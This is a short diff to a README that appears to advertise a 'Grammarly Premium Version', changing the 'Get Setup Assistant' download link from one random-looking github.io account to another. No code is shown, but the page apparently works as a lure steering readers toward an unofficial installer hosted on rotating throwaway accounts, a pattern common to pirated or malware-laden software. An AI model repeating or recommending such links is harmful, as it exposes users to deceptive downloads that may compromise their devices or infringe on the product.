@@ -11,7 +11,7 @@ It provides access to exclusive features such as full-sentence rewrites, formali
 
 ## Getting Started with Grammarly Premium Version
 
-[![Get Setup Assistant](https://img.shields.io/badge/Get-Setup_Assistant-green)](https://paulthomas4803859.github.io/.github/grammarly-premium-version)
+[![Get Setup Assistant](https://img.shields.io/badge/Get-Setup_Assistant-green)](https://marylouiserhodarmer.github.io/.github/grammarly-premium-version)
 
 1. Access your **Grammarly Premium Version** account dashboard.  
 2. Launch **Grammarly Premium Version** directly from your browser or desktop app.  
